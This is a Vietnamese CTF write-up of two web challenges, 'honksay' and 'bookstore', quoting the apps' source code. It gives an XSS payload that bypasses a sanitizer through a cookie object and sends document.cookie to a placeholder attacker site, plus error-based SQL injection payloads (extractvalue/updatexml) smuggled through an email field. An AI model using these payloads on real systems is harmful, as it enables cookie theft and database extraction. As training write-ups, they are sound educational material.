# honksay
![Picture](https://user-images.githubusercontent.com/87886468/187146364-be5d4596-96fc-4bf2-bbcb-cd9107c532e5.png)
### Kiểm tra chức năng web
Bắt đầu challenge, ta thấy trang web chỉ có 1 chỗ để đưa input vào, tiến hành xem source code web thì không có thuộc tính nào là hidden,ta nhập các dữ liệu bất kì cũng như payload xss thì đều sẽ được redirect tới /report. Ta dùng burpsuite để bắt request ta sẽ thấy body request là url=<your_input> .Ta tiến hành kiểm tra cookie thì thấy có 2 cookie là honk và honkCount tiến hành chỉnh sửa thì ta thấy cookie từ honk sẽ được sanitize xss còn honkCount thì không.

### Đọc source code
goose.js
```javascript
const puppeteer = require('puppeteer');
const FLAG = process.env.FLAG || "maple{fake}";

async function visit(url) {
  let browser, page;
  return new Promise(async (resolve, reject) => {
    try {
      browser = await puppeteer.launch({
        headless: true,
        args: [
          '--no-sandbox',
          '--disable-default-apps',
          '--disable-dev-shm-usage',
          '--disable-extensions',
          '--disable-gpu',
          '--disable-sync',
          '--disable-translate',
          '--hide-scrollbars',
          '--metrics-recording-only',
          '--mute-audio',
          '--no-first-run',
          '--safebrowsing-disable-auto-update'
                ]
            });
        page = await browser.newPage();
        await page.setCookie({
            name: 'flag',
            value: FLAG,
            domain: 'localhost',
            samesite: 'none'
        });
        await page.goto(url, {waitUntil : 'networkidle2' }).catch(e => console.log(e));
        console.log(page.cookies());
        await new Promise(resolve => setTimeout(resolve, 500));
        console.log("admin is visiting url:");
        console.log(url);
        await page.close();
        
        console.log("admin visited url");
        page = null;
    } catch (err){
        console.log(err);
    } finally {
        if (page) await page.close();
        console.log("page closed");
        if (browser) await browser.close();
        console.log("browser closed");
        //no rejectz
        resolve();
        console.log("resolved");
    }
  });
};


module.exports = { visit }
```
Ta sẽ hiểu hàm visit() sẽ nhận tham số là url, sau đấy sẽ tiến hành truy cập vào url nếu domain là localhost thì cookie flag sẽ được set. 
```javascript
page = await browser.newPage();
        await page.setCookie({
            name: 'flag',
            value: FLAG,
            domain: 'localhost',
            samesite: 'none'
        });
        await page.goto(url, {waitUntil : 'networkidle2' }).catch(e => console.log(e));
```
Đọc app.js

Ta thấy thêm 1 subdirectory là /changehonk và URL parameter là newhonk
```javascript
app.get('/changehonk', (req, res) => {
    res.cookie('honk', req.query.newhonk, {
        httpOnly: true
    });
    res.cookie('honkcount', 0, {
        httpOnly: true
    });
    res.redirect('/');
});
```
Khi truy cập http://honksay.ctf.maplebacon.org/ thì sẽ tiến hành kiểm tra xem client đã có cookie hay chưa, nếu chưa sẽ set cookie mặc định cho client, còn nếu đã có sẽ tiến hành kiểm tra nếu cookie là object thì sẽ set finalhonk là cookie, nếu không phải object thì sẽ tiến hành santize xss cookie và set value cho message và amountoftimeshonked.
```javascript
app.get('/', (req, res) => {
    if (req.cookies.honk){
        //construct object
        let finalhonk = {};
        if (typeof(req.cookies.honk) === 'object'){
            finalhonk = req.cookies.honk
        } else {
            finalhonk = {
                message: clean(req.cookies.honk), 
                amountoftimeshonked: req.cookies.honkcount.toString()
            };
        }
        res.send(template(finalhonk.message, finalhonk.amountoftimeshonked));
    } else {
        const initialhonk = 'HONK';
        res.cookie('honk', initialhonk, {
            httpOnly: true
        });
        res.cookie('honkcount', 0, {
            httpOnly: true
        });
        res.redirect('/');
    }
});
```
Ta đã thấy lỗ hỏng để ta có thể lấy flag 
```javascript
app.get('/', (req, res) => {
    if (req.cookies.honk){
        //construct object
        let finalhonk = {};
        if (typeof(req.cookies.honk) === 'object'){
            finalhonk = req.cookies.honk
        } else {
            finalhonk = {
                message: clean(req.cookies.honk), 
                amountoftimeshonked: req.cookies.honkcount.toString()
            };
        }
        res.send(template(finalhonk.message, finalhonk.amountoftimeshonked));
```
Ta sẽ làm cho cookie honk thành object và gán 1 trong 2 key với value là payload XSS, khi được render XSS sẽ xảy ra.

#### Payload
http://localhost:9988/changehonk?newhonk[message]=%3Cscript%3Evar%20i%20%20%3D%20new%20Image%28%29%3B%20i.src%20%3D%20%22https%3A%2F%2Fyour_website%3Fflag%3D%22%20%2B%20document.cookie%20%3C%2Fscript%3E

Hoặc
 
http://localhost:9988/changehonk?newhonk[amountoftimeshonked]=3Cscript%3Evar%20i%20%20%3D%20new%20Image%28%29%3B%20i.src%20%3D%20%22https%3A%2F%2Fyour_website%3Fflag%3D%22%20%2B%20document.cookie%20%3C%2Fscript%3E

#### Giải thích 
Hàm visit() sẽ truy cập vào url, nên ta sẽ cho truy cập vào localhost:9988 để flag cookie được set, khi ta truy cập vào /changehonk thì cookie honk  sẽ được set honk = req.query.newhonk, sau đấy sẽ redirect về /, sau khi redirect về /, sẽ tiến hành kiểm tra liệu cookie honk có phải là object, vì ta muốn bypass filter XSS nên ta sẽ cho cookie honk thành object, cookie honk sẽ được render và XSS sẽ xảy ra và gửi request tới server của ta với cookie. 

# bookstore
Challenge cho ta các source nên ta sẽ tiến hành xem qua các file.

Bắt đầu là file validator.js, ta thấy function validateEmail() sẽ dùng isEmail của thư viện validator. Ta tiến hành tìm source code của validator trên google và ta sẽ có code của  [isEmail](https://github.com/validatorjs/validator.js/blob/86a07ba4f3f710f639e92a62cf81dd3321ef9ee8/src/lib/isEmail.js) Tiến hành đọc qua code thì ta sẽ thấy 
```javascript
  if (user[0] === '"') {
    user = user.slice(1, user.length - 1);
    return options.allow_utf8_local_part ?
      quotedEmailUserUtf8.test(user) :
      quotedEmailUser.test(user);
  }
```
Xét email format: user@domain

isEmail sẽ xét phần user nếu user bắt đầu bằng " thì nó sẽ hiểu rằng chuỗi có dạng "something" sau đấy sẽ chuyển thành something, ta được dùng các kí tự có char code từ 13 đến 127 trong ASCII. Hàm validateEmail() sẽ thực thi khi ta tiến hành đăng ký email với option kindle, nên ta sẽ nhìn qua source code:
```javascript
 insertEmail(email, book_id) {
        const query = `INSERT INTO requests(email, book_id) VALUES('${email}', '${book_id}');`;
        return new Promise((resolve, reject) => {
            this.db.query(query, (error) => {
                if (error != null) {
                    reject(error);
                } else {
                    resolve(null);
                }
            })
        })
    }
```
Tại đây ta có ý tưởng sẽ kết thúc câu lệnh insert và chạy câu lệnh update cho title sẽ mang giá trị của texts để ta lấy flag, nhưng vì hàm isEmail giới hạn số kí tự, nên ta sẽ tìm cách khác, ta thấy rằng khi có lỗi xảy ra sẽ được hiển thị => Error Based Injection, tại đây ta có thể dùng updatexml hoặc là extractxml để tiến hành:
### Payload:
"',extractvalue(1,concat(1,(SELECT texts from books limit 1))))#@gmail.com

"',updatexml(1,concat(1,(SELECT texts from books limit 1)),1))#@gmail.com
### Thêm
Vì sao ta phải concat 1 với (SELECT texts from books limit 1) ? Vì ở đây ta đang lợi dụng updatexml hoặc extractvalue sẽ hiển thị ra lỗi với các thông tin mà ta muốn. Và để hiển thị ra lỗi thì tất nhiên ta phải làm cho nó xuất hiện lỗi, và lỗi ở đây chính là lỗi ngữ pháp (xpath grammar mistakes). Vì vậy ta nên concat với 1 hoặc các kí tự không thuộc grammar xpath để có thể lấy flag đầy đủ .
